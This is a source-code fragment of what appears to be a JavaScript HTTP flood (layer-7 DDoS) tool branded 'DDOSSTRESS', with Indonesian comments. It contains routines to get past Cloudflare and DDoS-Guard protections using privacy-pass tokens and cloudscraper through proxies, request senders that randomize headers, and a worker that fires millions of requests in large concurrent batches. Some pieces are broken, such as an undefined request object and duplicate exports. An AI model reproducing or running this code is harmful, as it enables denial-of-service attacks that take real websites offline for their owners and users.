                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US;q=0.9"
            }
        }, (err, res) => {
            if (!res) return false;

            if (res.headers["cf-chl-bypass"] && res.headers["set-cookie"]) {
                // lanjut proses
            } else {
                if (l7.firewall[1] === "captcha") {
                    logger("[cloudflare-bypass]: The target is not supporting privacypass");
                    return false;
                } else {
                    privacyPassSupport = false;
                }
            }

            cookie = res.headers["set-cookie"].shift().split(";").shift();

            if ((l7.firewall[1] === "captcha" && privacyPassSupport) || (force && privacyPassSupport)) {
                cloudscraper.get({
                    url: l7.target + "?_asds=" + num,
                    gzip: true,
                    proxy: proxy,
                    headers: {
                        "Connection": "Keep-Alive",
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": 1,
                        "User-Agent": uagent,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "en-US;q=0.9",
                        "challenge-bypass-token": l7.privacypass,
                        "Cookie": cookie
                    }
                }, (err, res) => {
                    if (err || !res) return false;

                    if (res.headers["set-cookie"]) {
                        cookie += "; " + res.headers["set-cookie"].shift().split(";").shift();

                        cloudscraper.get({
                            url: l7.target + "?_asds=" + num,
                            proxy: proxy,
                            headers: {
                                "Connection": "Keep-Alive",
                                "Cache-Control": "max-age=0",
                                "Upgrade-Insecure-Requests": 1,
                                "User-Agent": uagent,
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                "Accept-Encoding": "gzip, deflate, br",
                                "Accept-Language": "en-US;q=0.9",
                                "Cookie": cookie
                            }
                        }, (err, res, body) => {
                            if (err || !res || (res && res.statusCode === 403)) {
                                console.warn("[cloudflare-bypass ~ privacypass]: Failed to bypass with privacypass, generating new token:");
                                useNewToken();
                                return;
                            }
                            callback(cookie);
                        });
                    } else {
                        if (res.headers["cf-chl-bypass-resp"]) {
                            let respHeader = res.headers["cf-chl-bypass-resp"];
                            switch (respHeader) {
                                case "6":
                                    console.warn("[privacy-pass]: internal server connection error occurred");
                                    break;
                                case "5":
                                    console.warn(`[privacy-pass]: token verification failed for ${l7.target}`);
                                    useNewToken();
                                    break;
                                case "7":
                                    console.warn("[privacy-pass]: server indicated a bad client request");
                                    break;
                                case "8":
                                    console.warn(`[privacy-pass]: server sent unrecognised response code (${respHeader})`);
                                    break;
                            }
                            return bypassCloudflare(proxy, uagent, callback, true);
                        }
                    }
                });
            } else {
                cloudscraper.get({
                    url: l7.target + "?_asds=" + num,
                    proxy: proxy,
                    headers: {
                        "Connection": "Keep-Alive",
                        "Cache-Control": "max-age=0",
                        "Upgrade-Insecure-Requests": 1,
                        "User-Agent": uagent,
                        "Accept-Language": "en-US;q=0.9"
                    }
                }, (err, res) => {
                    if (err || !res || !res.request.headers.cookie) {
                        if (err && err.name === "CaptchaError") {
                            return bypassCloudflare(proxy, uagent, callback, true);
                        }
                        return false;
                    }
                    callback(res.request.headers.cookie);
                });
            }
        });
    } else if (l7.firewall[1] === "uam" && privacyPassSupport === false) {
        cloudscraper.get({
            url: l7.target + "?_asds=" + num,
            proxy: proxy,
            headers: {
                "Upgrade-Insecure-Requests": 1,
                "User-Agent": uagent
            }
        }, (err, res, body) => {
            if (err) {
                if (err.name === "CaptchaError") {
                    return bypassCloudflare(proxy, uagent, callback, true);
                }
                return false;
            }
            if (res && res.request.headers.cookie) {
                callback(res.request.headers.cookie);
            } else if (res && body && res.headers.server === "cloudflare") {
                if (/Why do I have to complete a CAPTCHA/.test(body) && res.statusCode !== 200) {
                    return bypassCloudflare(proxy, uagent, callback, true);
                }
            }
        });
    } else {
        cloudscraper.get({
            url: l7.target + "?_asds=" + num,
            gzip: true,
            proxy: proxy,
            headers: {
                "Connection": "Keep-Alive",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": 1,
                "User-Agent": uagent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US;q=0.9"
            }
        }, (err, res, body) => {
            if (err || !res || !body || !res.headers["set-cookie"]) {
                if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server === "cloudflare" && res.statusCode !== 200) {
                    return bypassCloudflare(proxy, uagent, callback, true);
                }
                return false;
            }
            cookie = res.headers["set-cookie"].shift().split(";").shift();
            callback(cookie);
        });
    }
}

module.exports = bypassCloudflare;

// ekspor fungsi supaya bisa dipakai di file lain
module.exports = bypass;

// --- Payload dan algoritma ---
function generatePayload() {
    return JSON.stringify({
        method: RipperSec,
        platform: platform1,
        version: versi,
        signature: siga,
        userAgent: uap1,
        referer: randomReferer
    });
}

// Fungsi request sederhana
function sendRequest(proxy) {
    const options = {
        hostname: parsedTarget.hostname,
        port: parsedTarget.port || (parsedTarget.protocol === "https:" ? 443 : 80),
        path: parsedTarget.path,
        method: RipperSec,
        headers: {
            "User-Agent": uap1,
            "Accept": accept,
            "Accept-Language": lang,
            "Referer": randomReferer,
            "Cache-Control": control,
            "Accept-Encoding": encoding
        }
    };

    const lib = parsedTarget.protocol === "https:" ? https : http;
    const req = lib.request(options, (res) => {
        console.log(`[${proxy}] Status: ${res.statusCode}`);
    });

    req.on("error", (err) => {
        console.error(`[${proxy}] Error: ${err.message}`);
    });

    // Tambahkan payload untuk POST
    if (RipperSec === "POST") {
        const payload = generatePayload();
        req.write(payload);
    }

    req.end();
}
// =======================
// BOT CHECKER MODULE
// =======================

const BOT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
const BOT_ACCEPT = "text/html";
const BOT_LANG = "en-US";
const BOT_CONTROL = "no-cache";
const BOT_ENCODING = "gzip";

// --- Daftar URL bot checker ---
const botUrls = [
    "https://isitdown.me/check_domain.php",
    "https://validator.w3.org/checklink?uri=",
    "https://www.isitdownrightnow.com/check.php?domain=",
];

// --- Fungsi untuk kirim request bot ---
function sendBotRequest(targetUrl, method = "GET", payload = null) {
    const parsedTarget = url.parse(targetUrl);
    const options = {
        hostname: parsedTarget.hostname,
        port: parsedTarget.port || (parsedTarget.protocol === "https:" ? 443 : 80),
        path: parsedTarget.path,
        method: method,
        headers: {
            "User-Agent": BOT_UA,
            "Accept": BOT_ACCEPT,
            "Accept-Language": BOT_LANG,
            "Referer": "https://google.com",
            "Cache-Control": BOT_CONTROL,
            "Accept-Encoding": BOT_ENCODING
        }
    };

    const lib = parsedTarget.protocol === "https:" ? https : http;
    const req = lib.request(options, (res) => {
        console.log(`[BOT] ${targetUrl} => Status: ${res.statusCode}`);
    });

    if (payload && method === "POST") {
        req.write(payload);
    }

    req.end();
}

// --- Fungsi untuk jalankan bot ke semua URL ---
function runBot(target) {
    botUrls.forEach((botUrl) => {
        let fullUrl = botUrl.includes("=") ? `${botUrl}${target}` : botUrl;
        sendBotRequest(fullUrl);
    });
}
function sendAttackRequest(targetUrl) {
    const parsedTarget = url.parse(targetUrl);
    const lib = parsedTarget.protocol === "https:" ? https : http;

    const options = {
        hostname: parsedTarget.hostname,
        port: parsedTarget.port || (parsedTarget.protocol === "https:" ? 443 : 80),
        path: parsedTarget.path,
        method: "GET",
        headers: {
            "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
            "Accept": acceptHeader[Math.floor(Math.random() * acceptHeader.length)],
            "Accept-Language": langHeader[Math.floor(Math.random() * langHeader.length)],
            "Referer": referers[Math.floor(Math.random() * referers.length)],
            "Cache-Control": controlHeader[Math.floor(Math.random() * controlHeader.length)],
            "Accept-Encoding": encodingHeader[Math.floor(Math.random() * encodingHeader.length)]
        }
    };
    req.end();
}
function randomQuery() {
    return `?r=${Math.random().toString(36).substring(2,10)}`;
}

// --- Fungsi payload bypass Cloudflare/DDoS-Guard ---
function sendBypassRequest(targetUrl, method = "GET", payload = null) {
    const parsedTarget = url.parse(targetUrl + randomQuery());
    const lib = parsedTarget.protocol === "https:" ? https : http;

    const options = {
        hostname: parsedTarget.hostname,
        port: parsedTarget.port || (parsedTarget.protocol === "https:" ? 443 : 80),
        path: parsedTarget.path,
        method: method,
        headers: {
            "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
            "Accept": acceptHeader[Math.floor(Math.random() * acceptHeader.length)],
            "Accept-Language": langHeader[Math.floor(Math.random() * langHeader.length)],
            "Referer": referers[Math.floor(Math.random() * referers.length)],
            "Cache-Control": controlHeader[Math.floor(Math.random() * controlHeader.length)],
            "Accept-Encoding": encodingHeader[Math.floor(Math.random() * encodingHeader.length)]
        }
    };

    const req = lib.request(options, (res) => {
        console.log(`[BYPASS] ${targetUrl} => Status: ${res.statusCode}`);
    });

    req.on("error", (err) => {
        console.error(`[BYPASS] ${targetUrl} => Error: ${err.message}`);
    });

    if (payload && method === "POST") {
        req.write(payload);
    }

    req.end();
}

// --- Layer 7 ---
// --- Layer 7 ---
async function mainWorkerLayer7(workerId, targetUrl) {
  const MAX_REQUESTS = 10000000;
  const BATCH_SIZE   = 3000;
  let sentRequests = 0, errors = 0;
  const lib = targetUrl.protocol === "https:" ? https : http;
  const agent = new lib.Agent({ keepAlive: true, maxSockets: 20000 });

  const endTime = Date.now() + duration;

  while (sentRequests < MAX_REQUESTS && Date.now() < endTime) {
    const batch = [];

    for (let i = 0; i < BATCH_SIZE && sentRequests + i < MAX_REQUESTS; i++) {
      const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
      batch.push(new Promise(resolve => {
        const options = { agent, headers: { "User-Agent": randomUA } };
        const req = lib.get(targetUrl, options, res => {
          sentRequests++;

          if (res.statusCode >= 400) {
            collectError(targetUrl.hostname, `error ${res.statusCode} (${res.statusMessage})`);
          }

          res.resume();
          resolve();
        });
        req.on("error", (err) => {
          errors++;
          collectError(targetUrl.hostname, `${err.code || "ECONN"} (Connection error)`);
          resolve();
        });
      }));
    }

    if (batch.length === 0) break;  // 🔥 kalau udah gak ada request, langsung berhenti

    await Promise.all(batch);
    await new Promise(r => setTimeout(r, 10));
  }

  // 🔥 setelah loop selesai, otomatis berhenti worker
  console.log(chalk.cyan(`[ DDOSSTRESS ] -> Engine ${workerId} Finished. Total Requests: ${sentRequests}, Errors: ${errors}`));
  process.exit(0);
}

//== check firewall ==
function getTime() {
    const now = new Date();
    return now.toTimeString().split(" ")[0];
}

// tampilkan firewall sekali saat target dikenali
let firewallLogged = false; // flag agar log hanya muncul sekali

function bypass(proxy, uagent, callback, force, cookie) {
    const fw = l7.firewall[0];

    // log firewall hanya sekali
    if (!firewallLogged && fw) {
        console.log(
            "[ DDOSSTRESS ] [" + getTime() + "] -> Firewall Detected: " + fw
        );
        firewallLogged = true;
    }

    if (fw === "ddos-guard") {
        return Ddguard(proxy, uagent, callback, force, cookie);
    } else if (fw === "cloudflare") {
        return bypassCloudflare(proxy, uagent, callback, force);
    } else {
        console.warn(
            "[ DDOSSTRESS ] [" + getTime() + "] -> Firewall type tidak dikenali: " + fw
        );
        return false;
    }
}
